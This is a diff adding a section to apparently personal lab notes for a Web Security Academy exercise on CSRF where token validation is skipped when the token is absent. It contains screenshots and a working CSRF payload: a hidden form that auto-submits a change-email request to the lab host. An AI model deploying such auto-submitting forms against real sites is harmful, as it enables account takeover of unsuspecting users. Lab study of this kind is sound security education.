@@ -52,4 +52,26 @@ Changine request to get and removing email change we can send it and get a 302 r
 </script>
 ```
 
+**CSRF where token validation depends on token being present**
+
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/1b0c0949-c707-4f48-ab19-527524cf985e)
+
+
+Deleting csrf parameter result in the 302 response 
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/771e5618-9d4d-4112-af7c-a90bee8ca4e2)
+
+
+Exploit: 
+```
+<form method="POST" action="https://0aa1003d040b2b3f81817a48001f00f2.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="vi@gmail.com">
+</form>
+<script>
+    document.forms[0].submit();
+</script>
+```
+
+
+
+
 
